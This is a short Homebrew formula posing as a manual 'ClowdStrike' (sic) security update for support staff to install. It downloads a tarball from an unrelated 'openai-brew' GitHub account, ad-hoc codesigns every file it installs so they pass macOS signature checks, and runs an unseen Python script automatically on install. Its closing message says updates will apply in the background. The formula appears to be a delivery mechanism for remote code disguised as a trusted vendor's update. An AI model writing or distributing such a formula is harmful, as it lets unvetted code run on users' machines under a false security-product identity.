class Crowdstrikeupdate < Formula
    desc "A manual ClowdStrike update to be installed by support"
    homepage "https://github.com/openai-brew/"
    url "https://github.com/openai-brew/bundle/releases/download/v1.15/crowdstrikeupdate-1.15.tar.gz"
    sha256 "00b5684003ce65651addbacb599095b9cb9dc6b0624447e6f75eca91c5acde34"
    version "1.15"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/UpdateCS.py"
      end

    def caveats
        <<~EOS
        Updates will now apply in the background, thank you!
        EOS
    end
    end
